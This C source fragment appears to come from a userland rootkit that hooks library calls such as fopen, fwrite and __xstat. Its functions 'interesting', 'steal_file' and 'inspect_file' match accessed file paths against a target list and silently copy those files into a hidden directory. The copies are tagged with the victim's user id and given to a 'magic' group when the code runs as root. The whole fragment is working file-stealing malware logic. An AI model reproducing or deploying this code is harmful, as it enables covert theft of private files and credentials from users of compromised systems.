int interesting(const char *path){
    char *interesting_file;
    int v = 0;

    for(int i = 0; i < INTERESTING_FILES_SIZE; i++){
        interesting_file = interesting_files[i];
        if(!strncmp(interesting_file, path, strlen(interesting_file))){
            v = 1;
            break;
        }

        if(!fnmatch(interesting_file, path, FNM_PATHNAME)){
            v = 1;
            break;
        }
    }

    return v;
}

int write_copy(const char *old_path, char *new_path, off_t filesize){
    unsigned char *buf;
    FILE *ofp, *nfp;
    size_t n, m;

    hook(CFOPEN, CFWRITE);
    

    ofp = call(CFOPEN, old_path, "rb");
    if(ofp == NULL) return -1;

    nfp = call(CFOPEN, new_path, "wb");
    if(nfp == NULL){
        fclose(ofp);
        return -1;
    }

    buf = malloc(filesize+1);
    memset(buf, 0, filesize+1);

    do {
        n = fread(buf, 1, filesize, ofp);
        if (n) m = (long)call(CFWRITE, buf, 1, n, nfp);
        else   m = 0;
    }while((n > 0) && (n == m));

    free(buf);

    fclose(ofp);
    fclose(nfp);

    return 1;
}

char *get_new_path(char *filename){
    int path_maxlen = strlen(INTEREST_DIR) +
                      strlen(filename) + 12;  /* +12. 1-6 for uid.     */
                                              /* another 6 should we   */
                                              /* we end up linking it. */

    char *ret = malloc(path_maxlen),
         *_filename = strdup(filename);

    if(_filename[0] == '.') // remove prefixed '.' if there is one.
        memmove(_filename, _filename + 1, strlen(_filename));

    snprintf(ret, path_maxlen, "%s/%s-%d",
                                INTEREST_DIR,
                                _filename,
                                getuid());

    free(_filename);
    return ret;
}

int steal_file(const char *old_path, char *filename, char *new_path){
    struct stat astat, // for old_path.
                pstat; // for new_path, should it exist, to check if there's a change in size.

    hook(C__XSTAT);

    memset(&astat, 0, sizeof(stat));

    if((long)call(C__XSTAT, _STAT_VER, old_path, &astat) < 0) return -1;
    if(!S_ISREG(astat.st_mode)) return 1;   /* we only want to look at regular files. */
#ifdef MAX_FILE_SIZE
    if(astat.st_size > MAX_FILE_SIZE)
        return 1;
#endif

    memset(&pstat, 0, sizeof(stat));
    
    /* file already exists(?) */
    if((long)call(C__XSTAT, _STAT_VER, new_path, &pstat)){   /* if the file's different. copy it. */
        if(pstat.st_size != astat.st_size)
            return write_copy(old_path, new_path, astat.st_size);
    }else return write_copy(old_path, new_path, astat.st_size);  /* file doesn't exist yet, let's write it */

    return -1;
}

void inspect_file(const char *pathname){
    char *filename = basename(pathname),
         *new_path;
    int steal_status;

    if(interesting(pathname) || interesting(filename)){
        new_path = get_new_path(filename);
        steal_status = steal_file(pathname, filename, new_path);

        if(steal_status < 0){
            free(new_path);
            return;
        }

        if(!not_user(0)){
            gid_t magicgid = readgid();
            chown_path(new_path, magicgid);
        }
        free(new_path);
    }
}
